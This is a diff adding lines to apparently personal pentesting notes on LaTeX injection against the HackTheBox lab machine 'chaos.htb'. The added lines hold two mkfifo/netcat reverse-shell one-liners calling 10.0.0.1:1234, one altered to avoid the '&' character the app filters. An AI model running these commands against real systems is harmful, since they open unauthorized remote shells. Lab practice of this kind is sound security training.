@@ -1,5 +1,14 @@
 LATEX:Latex is weird, but it's turing complete, and it's vulnerable.. 
 VM: chaos.htb; there's a pdf page that allows injection
+Note: When doing command injection through a web app like chaos, it doesn't like 
+      the ampersand '&' input which can be troublesome if you're doing a common
+      reverse shell that redirects stderr to stdin
+
+$ mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+- just drop the redirect and proceed
+$ mkfifo /tmp/f;cat /tmp/f|/bin/sh -i | nc 10.0.0.1 1234 >/tmp/f
+
 
 READ FILES 
 ====
